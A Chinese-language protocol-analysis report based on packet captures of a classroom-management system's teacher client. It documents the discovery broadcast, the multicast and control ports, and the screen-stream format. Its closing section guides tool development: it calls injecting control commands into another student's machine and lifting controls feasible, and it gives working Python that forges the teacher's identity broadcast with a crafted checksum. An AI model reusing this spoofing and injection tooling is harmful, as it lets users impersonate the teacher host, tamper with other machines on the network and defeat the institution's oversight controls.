# 12 教师端真实抓包实证

> 本报告基于 **真实教师端**（非自制工具）的抓包数据，用于**一锤定音**地回答几个关键争议点。
> 数据来源：`evidence/captured-logs/`（原始 pcapng + tshark 文本导出）
> 抓包环境：教师机 `192.168.5.18`，教师端已打开并点击若干功能，**未连接任何学生端**，时长约 348 秒。

| 可信度 | ❌ 循环论证 | ✅ **独立实证** |

## 五、决定性结论汇总

### ✅ 结论 1：原生教师端报文**无 `/*//` 前缀**

- 7777 广播：首字节 `7b`(`{`)，明文 JSON
- 其余业务载荷开头为 `{` / `ff ff` / `fd 01`，**无一处以 `2f 2a 2f 2f`(`/*//`) 开头**
- 双重印证 [10 报告](./10_行为管控报文核查定稿.md) 的反汇编结论：**`/*//` 是死代码 / 自制工具臆造**

### ✅ 结论 2：管控指令**非周期发送**（印证 [11 报告](./11_指令发送机制分析.md)）

- 未连学生时 **8040 零流量**
- 教师端周期性发送的是 **7777 身份广播**，与管控无关

### ✅ 结论 3：教师端发现机制 = **7777 广播 + 7771 扫描**

回答 [01 报告](./01_通信机制.md) 的"学生端如何找到教师端"：

```
教师端 → 7777 广播 {"msg_id":"teacherip","teacher_ip":...}   （每 3 秒，全子网）
教师端 → 7771 组播 "teacher"                                 （每 0.11 秒）
学生端 收到后即可获知教师 IP 与频道号
```

### ✅ 结论 4：屏幕广播 = **组播 + 自定义头 + H.264 裸流**

- 组播地址 **由教师 IP 推导**：`229.1.<ip3>.<ip4>`
- 对此的修正：**之前猜测的 RTP 封装不成立**

## 七、对工具开发的指导

| 目标 | 依据 |
|---|---|
| **A→B 注入管控** | ✅ 可行：8040 是 UDP 无连接（[10 报告](./10_行为管控报文核查定稿.md)） |
| **解除管控稳定** | ✅ 可行：教师端不周期重发管控（[11 报告](./11_指令发送机制分析.md)） |
| **模拟教师机上线**（可选） | 需复刻 7777 广播：`{"channel":N,"checksum":随机,"msg_id":"teacherip","teacher_ip":"<伪造IP>"}` |
| **是否需模拟 7777** | 若 B 已连教师端，仅发 8040 即可；若要"无教师端环境下让 B 认为有教师"，需伪造 7777 |

### 7777 伪造示例（Python）

```python
import socket, json, random

def fake_teacher_broadcast(channel, teacher_ip, times=1, interval=3):
    for _ in range(times):
        # checksum：6 位十进制（奇位奇、偶位偶，见 07 报告）
        checksum = 0
        for i in range(6):
            base = random.randint(0, 9)
            checksum = checksum * 10 + (base if base % 2 == i % 2 else (base + 1) % 10)
        msg = json.dumps({
            "channel": channel,
            "checksum": checksum,
            "msg_id": "teacherip",
            "teacher_ip": teacher_ip
        }, indent=3, ensure_ascii=False)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(msg.encode('utf-8'), ("255.255.255.255", 7777))
        s.close()
```

> ⚠️ `checksum` 格式（5 位 vs 6 位）会影响报文长度（105 vs 106），学生端可能校验位数，建议**完整性优先实现**。
